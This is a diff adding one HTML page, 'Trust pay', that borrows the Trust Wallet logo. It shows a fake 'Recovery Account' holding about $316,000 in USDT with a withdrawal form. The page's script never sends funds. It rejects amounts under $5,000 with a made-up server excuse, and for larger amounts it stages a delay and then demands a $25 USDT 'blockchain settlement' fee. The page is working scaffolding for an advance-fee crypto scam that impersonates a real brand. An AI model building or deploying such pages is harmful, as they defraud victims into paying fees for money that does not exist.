@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Trust pay</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    :root {
+      --primary: #0052ff;
+      --accent: #00c2ff;
+      --bg: #f4f6fa;
+      --card: #ffffff;
+      --text: #333;
+      --error: #d9534f;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: var(--bg);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .screen {
+      display: none;
+      background: var(--card);
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 420px;
+      padding: 30px;
+      text-align: center;
+      transition: all 0.5s ease;
+    }
+
+    .active {
+      display: block;
+    }
+
+    .logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      color: var(--primary);
+      margin-bottom: 10px;
+    }
+
+    .balance {
+      font-size: 26px;
+      font-weight: bold;
+      color: var(--text);
+      margin-bottom: 20px;
+    }
+
+    .crypto-list {
+      text-align: left;
+      margin-top: 20px;
+    }
+
+    .crypto-item {
+      padding: 12px;
+      border-bottom: 1px solid #eee;
+      font-size: 15px;
+      color: var(--text);
+    }
+
+    .crypto-item span {
+      float: right;
+      font-weight: bold;
+      color: var(--primary);
+    }
+
+    input[type="text"], input[type="number"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 12px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 15px;
+    }
+
+    button {
+      background-color: var(--primary);
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: var(--accent);
+    }
+
+    .message {
+      margin-top: 15px;
+      font-weight: bold;
+      color: var(--error);
+    }
+
+    .notice {
+      margin-top: 25px;
+      font-size: 0.9em;
+      color: #555;
+      line-height: 1.4;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Welcome Screen -->
+  <div class="screen active" id="welcomeScreen">
+    <img src="https://trustwallet.com/assets/images/media-kit/logo.png" alt="Trust Wallet Logo" class="logo">
+    <h2>Welcome Back</h2>
+    <button onclick="openDashboard()">OPEN</button>
+  </div>
+
+  <!-- Dashboard Screen -->
+  <div class="screen" id="dashboardScreen">
+    <h2>Recovery Account</h2>
+    <div class="balance">$316,377.59</div>
+    <div class="crypto-list">
+      <div class="crypto-item">USDT (Tron) <span>$316,500</span></div>
+      <div class="crypto-item">DOGE <span>$0.13</span></div>
+      <div class="crypto-item">TRX <span>$0.41</span></div>
+      <div class="crypto-item">BTC <span>$0.13</span></div>
+      <div class="crypto-item">ETH <span>$0.01</span></div>
+      <div class="crypto-item">BNB <span>$0.00</span></div>
+    </div>
+
+    <!-- Withdrawal Section -->
+    <h3 style="margin-top:30px; color: var(--primary);">Send USDT</h3>
+    <input type="text" id="walletAddress" placeholder="Enter wallet address">
+    <input type="number" id="withdrawAmount" placeholder="Enter withdrawal amount (USDT)">
+    <button onclick="processWithdrawal()">SEND</button>
+    <div class="message" id="message"></div>
+    <div class="notice">
+      â ï¸ Payment takes only <strong>9 seconds</strong> to reach your wallet.<br>
+      A fee of <strong>$25 USDT</strong> is required for <em>BLOCKCHAIN SETTLEMENT</em> to ensure immediate and FINAL TRANSACTION RELEASE.
+    </div>
+  </div>
+
+  <script>
+    function openDashboard() {
+      document.getElementById("welcomeScreen").classList.remove("active");
+      document.getElementById("dashboardScreen").classList.add("active");
+    }
+
+    function processWithdrawal() {
+      const address = document.getElementById("walletAddress").value.trim();
+      const amount = parseFloat(document.getElementById("withdrawAmount").value);
+      const messageDiv = document.getElementById("message");
+      messageDiv.textContent = "";
+
+      if (!address || isNaN(amount)) {
+        messageDiv.textContent = "Please enter a valid wallet address and amount.";
+        return;
+      }
+
+      if (amount < 5000) {
+        messageDiv.textContent = "Withdrawal canât process due to low volume demand in the server. Withdrawal amount should be above $5000.";
+        return;
+      }
+
+      messageDiv.textContent = "Processing withdrawal...";
+      setTimeout(() => {
+        messageDiv.textContent = "Error: $25 USDT fee required for withdrawal processing to your address.";
+      }, 8000);
+    }
+  </script>
+
+</body>
+</html>
